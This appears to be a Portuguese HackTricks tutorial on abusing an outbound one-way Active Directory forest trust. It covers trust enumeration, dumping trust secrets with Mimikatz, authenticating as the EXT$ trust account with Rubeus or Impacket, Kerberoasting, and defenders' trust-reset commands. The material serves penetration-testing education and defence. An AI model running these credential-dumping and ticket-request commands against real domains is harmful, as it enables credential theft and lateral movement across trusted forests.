# Domínio de Floresta Externa - Unidirecional (Saída)

{{#include ../../banners/hacktricks-training.md}}

Neste cenário, **seu domínio** está **confiando alguns **privilégios** a principals de um **domínio/floresta diferente**.

## Enumeração

### Confiança de Saída
```bash
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
Se você tiver o módulo AD disponível, inspecione também diretamente o **Trusted Domain Object (TDO)**. Isso fornece os dados brutos de trust baseados em LDAP de que você precisará posteriormente ao decidir se o caminho mais fácil é o **FSP/group abuse** ou o **trust-account abuse**:
```powershell
# Enumerate the TDO created for the foreign forest/domain
Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -SearchBase "CN=System,$((Get-ADDomain).DistinguishedName)" -Properties trustDirection,trustType,trustAttributes,flatName,securityIdentifier,whenCreated,whenChanged |
Select Name,flatName,trustDirection,trustType,trustAttributes,securityIdentifier,whenCreated,whenChanged

# Fast trust hygiene check from the outbound side
Get-ADTrust -Identity ext.local -Properties ForestTransitive,SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation
```
Você também deve enumerar onde os foreign principals de `CN=ForeignSecurityPrincipals` receberam acesso efetivamente. Exemplos comuns:

- **Local admin** em um servidor/DC no seu domínio atual
- Associação a um **custom domain group** que possui ACLs sobre usuários/computadores/GPOs
- Direitos para modificar **computer objects**, que posteriormente podem se tornar [RBCD](resource-based-constrained-delegation.md) se a configuração do trust permitir

## Trust Account Attack

Quando um trust unidirecional é criado do domínio/floresta **B** para o domínio/floresta **A** (**B trusts A**), uma **trust account** para **B** é criada em **A**. Na visão do outbound trust de **A**, isso é útil porque, se você posteriormente comprometer **B** (o lado que confia), poderá fazer dump do trust secret nesse local e autenticar-se novamente em **A** como `B$`.<sup>[[1]](#references)</sup>

O aspecto crítico a entender aqui é que a senha e o material Kerberos dessa trust account podem ser extraídos de um Domain Controller no domínio **trusting** usando:<sup>[[1]](#references)</sup>
```bash
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
Isso funciona porque a conta de confiança criada no domínio **confiável** é um principal habilitado que acaba tendo os direitos básicos de um usuário de domínio normal nesse domínio. Isso geralmente é suficiente para começar a enumerar o LDAP, solicitar tickets e encontrar o próximo caminho de escalação.<sup>[[1]](#references)</sup>

Em um cenário em que `ext.local` é o domínio **confiante** e `root.local` é o domínio **confiável**, uma conta de usuário chamada `EXT$` é criada dentro de `root.local`. Extrair as trust keys de `ext.local` revela credenciais que podem ser usadas como `root.local\EXT$` contra `root.local`:<sup>[[1]](#references)</sup>
```bash
lsadump::trust /patch
```
Em seguida, use a chave **RC4** extraída para autenticar-se como `root.local\EXT$` dentro de `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
Em seguida, enumere o domínio confiável como esse principal, por exemplo, fazendo Kerberoasting de um SPN de alto valor em `root.local`:<sup>[[1]](#references)</sup>
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### Do Linux

Se você recuperou a chave da conta de confiança **RC4**, a mesma ideia funciona no Linux com o Impacket:
```bash
python getTGT.py -dc-ip dc.root.local root.local/EXT\$ -hashes :<RC4>
export KRB5CCNAME=EXT\$.ccache

# Kerberoast from the trusted domain as the trust account
GetUserSPNs.py -request -k -no-pass -dc-ip dc.root.local root.local/EXT\$ -outputfile root_spns.kerberoast

# Or reduce noise and request only one user
GetUserSPNs.py -request-user svc_sql -k -no-pass -dc-ip dc.root.local root.local/EXT\$
```
Se **RC4** não for aceito, use como alternativa a **senha em texto claro** recuperada (ou as chaves **AES** derivadas) e reutilize os workflows usuais de [Over-Pass-the-Hash / Pass-the-Key](over-pass-the-hash-pass-the-key.md) e [Kerberoast](kerberoast.md) a partir desse foothold.

### Armadilhas do material de chaves

Não confunda **chaves de trust** com **credenciais de trust-account**:<sup>[[1]](#references)</sup>

- Em um trust unidirecional, ambos os lados armazenam um **TDO**, mas a conta de usuário **`EXT$`** real só existe no trusted domain.
- A senha atual da trust-account é refletida no trust secret do TDO (`NewPassword` / chave de trust atual).
- A chave **RC4** da trust é o artefato mais fácil de reutilizar com `asktgt` como a trust-account; em configurações padrão, esse geralmente é o enctype funcional, pois a trust-account costuma ter um `msDS-SupportedEncryptionTypes` vazio.
- Se você estiver pensando em **chaves AES de trust**, lembre-se de que elas não são intercambiáveis com as chaves AES da trust-account, pois os salts são diferentes.

Portanto, para a técnica desta página, prefira o material **RC4** extraído ou a senha em **texto claro** recuperada.<sup>[[1]](#references)</sup>

### Obtendo a senha de trust em texto claro

No fluxo anterior, foi usado o hash da trust em vez da **senha em texto claro** (que também é **extraída pelo mimikatz**).<sup>[[1]](#references)</sup>

A senha em texto claro pode ser obtida convertendo a saída \[ CLEAR ] do mimikatz de hexadecimal e removendo os bytes nulos `\x00`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Obtendo a senha de trust em texto claro: A senha em texto claro pode ser obtida convertendo a saída ( CLEAR ) do mimikatz de hexadecimal e removendo os bytes nulos...](<../../images/image (938).png>)

Às vezes, ao criar uma relação de trust, o usuário precisa inserir uma senha para o trust. Nesta demonstração, a chave é a senha de trust original e, portanto, legível por humanos. Conforme a chave é rotacionada (padrão: a cada 30 dias), o texto claro normalmente deixará de ser legível por humanos, mas ainda poderá ser usado tecnicamente.<sup>[[1]](#references)</sup>

A senha em texto claro pode ser usada para realizar uma autenticação comum como a trust-account, como alternativa a solicitar um TGT com a chave secreta Kerberos da trust-account. Aqui, consultando `root.local` a partir de `ext.local` em busca de membros de `Domain Admins`:<sup>[[1]](#references)</sup>

![Trust Account Attack - Obtendo a senha de trust em texto claro: A senha em texto claro pode ser usada para realizar uma autenticação comum como a trust-account, como alternativa a solicitar um TGT...](<../../images/image (792).png>)

### Limitações práticas

> [!WARNING]
> Trust accounts são principals pouco convenientes. Logons interativos, como **RUNAS / console / RDP**, não são o caminho esperado aqui, e as tentativas de autenticação **NTLM** podem falhar com `STATUS_NOLOGON_INTERDOMAIN_TRUST_ACCOUNT`. Planeje usar **logons de rede Kerberos** (`asktgt`, LDAP, CIFS, Kerberoast).<sup>[[1]](#references)</sup>

### Nota sobre persistência / limpeza

Se os defenders perceberem que o trusting domain foi comprometido, deverão rotacionar o trust secret **em ambos os lados** com `netdom trust ... /resetOneSide ...`. Do ponto de vista do operator, isso é importante porque um **reset manual invalida imediatamente o material de trust antigo**, enquanto a rotação normal da senha de trust mantém os valores atual/anterior durante o rollover.<sup>[[2]](#references)</sup>
```bash
# Run once from the trusted side
netdom trust root.local /domain:ext.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*

# Run once from the trusting side
netdom trust ext.local /domain:root.local /resetOneSide /passwordT:<NEWPASS> /userO:administrator /passwordO:*
```
## Referências

- [1] [SID filter as security boundary between domains? (Part 7) – Trust account attack – de trusting para trusted](https://itm8.com/articles/sid-filter-as-security-boundary-between-domains-part-7)
- [2] [AD Forest Recovery – Redefinindo uma senha de trust](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/forest-recovery-guide/ad-forest-recovery-reset-trust)

{{#include ../../banners/hacktricks-training.md}}
